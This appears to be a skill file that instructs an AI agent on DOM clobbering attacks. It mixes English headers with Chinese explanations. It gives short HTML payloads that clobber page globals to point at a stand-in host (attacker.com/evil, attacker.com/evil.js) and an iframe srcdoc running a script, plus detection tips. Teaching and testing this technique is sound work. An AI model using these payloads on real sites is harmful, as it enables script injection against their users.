---
name: s-dom-clobbering
description: DOM Clobbering Attack skill. Covers HTMLCollection/named property injection, form/iframe-based DOM property override, script-src CSP bypass via DOM clobbering, and modern framework-specific DOM clobbering gadgets.
---

# Unified DOM Clobbering

## When To Use

Use for discovering DOM clobbering vectors, bypassing script-src CSP via DOM clobbered variables, exploiting named property injection (HTMLCollection), and framework-specific DOM clobbering gadgets (React/Angular/Vue).

## Source Priority

| Task Type | Primary Source |
|---|---|
| Methodology | hack-skills |
| Execution | AboutSecurity |
| Ctf | hack-skills |
| Bug Bounty | hack-skills |
| Resources | AboutSecurity |

## Source Strategy

DOM Clobbering is an advanced XSS technique. Start with XSS fundamentals (`s-xss`), then use this skill for DOM clobbering-specific exploitation patterns.

## Matched hack-skills Skills

- `../../security-sources/hack-skills/skills/xss-cross-site-scripting/SKILL.md` — (see ADVANCED_XSS_TRICKS for DOM Clobbering section)
- `../../security-sources/hack-skills/skills/csp-bypass-advanced/SKILL.md` — CSP Bypass Advanced

## Matched AboutSecurity Skills

- `../../security-sources/AboutSecurity/skills/exploit/web-method/xss-methodology/SKILL.md` — (see csp-bypass-and-dom-xss.md reference)

## References

See `references/SOURCES.md`.

## DOM Clobbering 核心概念

### 什么是 DOM Clobbering
当 HTML 中插入带有 `id` 或 `name` 属性的元素时，这些元素会作为 `window` / `document` 的属性可被访问。当 JS 代码使用未经检查的全局变量时，攻击者可通过注入 HTML 元素"覆盖"（clobber）这些变量。

### 核心利用模式

**1. HTMLCollection 覆盖**
```html
<a id="config" href="http://attacker.com/evil">click</a>
```
当 JS 代码 `if (config.url.startsWith('/api'))` 存在时，`config` 变为 `<a>` 元素，`.url` 变为 `"http://attacker.com/evil"`。

**2. Form 嵌套属性覆盖**
```html
<form id="config">
  <input name="url" value="http://attacker.com/evil">
</form>
```
`config.url` → `<input>` 元素（而非其 value），需要 `.url.value` 或同名 `name=url` + `id=config` 形成两级属性。

**3. Script-src CSP 绕过**
```html
<a id="scriptSrc" data-x="http://attacker.com/evil.js">x</a>
```
然后利用 `scriptSrc.dataset.x` 加载外部脚本（结合特定框架的脚本加载逻辑）。

**4. iframe sandbox + name 覆盖**
```html
<iframe name="x" srcdoc="<script>alert(1)</script>"></iframe>
```
当代码执行 `x.eval(...)` 时，`x` 指向 `<iframe>` 的 `contentWindow`。

### 检测方法
- 审查 JS 代码中未声明直接使用的全局变量（`myVar.something` 而没有 `var myVar`）
- 扫描 innerHTML/insertAdjacentHTML 注入点——是否有 HTML 注入但没有 JS 执行的路径
- 框架特定模式：检查 webpack 打包的模块级变量是否可能被全局对象覆盖

## Important Agent Rules

- DOM Clobbering 通常需要 HTML 注入（但不能直接执行 JS）——是 XSS 的子类型
- 现代框架（React/Vue/Angular）对 DOM Clobbering 有一定防护，但自定义 JS 代码中仍常见
- Only operate in authorized environments.
